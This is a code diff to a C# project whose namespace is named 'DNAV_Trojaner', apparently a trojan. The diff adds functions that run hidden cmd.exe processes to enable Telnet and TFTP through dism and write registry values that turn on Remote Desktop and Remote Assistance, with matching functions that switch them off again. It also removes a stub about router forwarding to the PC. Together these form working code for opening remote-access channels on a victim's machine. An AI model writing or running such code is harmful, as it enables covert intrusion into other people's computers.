@@ -6,6 +6,7 @@ using System.Threading.Tasks;
 using System.Net;
 using System.Net.Sockets;
 using System.IO;
+using System.Diagnostics;
 
 namespace DNAV_Trojaner
 {
@@ -52,9 +53,44 @@ namespace DNAV_Trojaner
               }              
               return tmp;
          }
+        
+        static public void deactivate(){
+            ExecuteCommand("dism /online /Disable-Feature /FeatureName:TelnetClient");
+            ExecuteCommand("dism /online /Disable-Feature /FeatureName:TFTP");
+            Microsoft.Win32.RegistryKey key;
+            key = Microsoft.Win32.Registry.LocalMachine.CreateSubKey(@"SYSTEM\CurrentControlSet\Control\Terminal Server");
+            key.SetValue("fDenyTSConnections", "1");
+            key = Microsoft.Win32.Registry.LocalMachine.CreateSubKey(@"SYSTEM\CurrentControlSet\Control\Terminal Server");
+            key.SetValue("fAllowToGetHelp", "0");
+            key.Close();
+        }
 
-        static public void remap(){
-            //! Router forwarding to PC
+        static public void activate(){
+            ExecuteCommand("dism /online /Enable-Feature /FeatureName:TelnetClient");
+            ExecuteCommand("dism /online /Enable-Feature /FeatureName:TFTP");
+            Microsoft.Win32.RegistryKey key;
+            key = Microsoft.Win32.Registry.LocalMachine.CreateSubKey(@"SYSTEM\CurrentControlSet\Control\Terminal Server");
+            key.SetValue("fDenyTSConnections", "0");
+            key = Microsoft.Win32.Registry.LocalMachine.CreateSubKey(@"SYSTEM\CurrentControlSet\Control\Terminal Server");
+            key.SetValue("fAllowToGetHelp", "1");
+            key.Close();
+        }
+
+        static void ExecuteCommand(string command)
+        {
+            int exitCode;
+            ProcessStartInfo processInfo;
+            Process process;
+            processInfo = new ProcessStartInfo("cmd.exe", "/c " + command)
+            {
+                CreateNoWindow = true,
+                UseShellExecute = false,
+                RedirectStandardError = true,
+                RedirectStandardOutput = true
+            };
+            process = Process.Start(processInfo);
+            process.WaitForExit();
+            process.Close();
         }
     }
 }
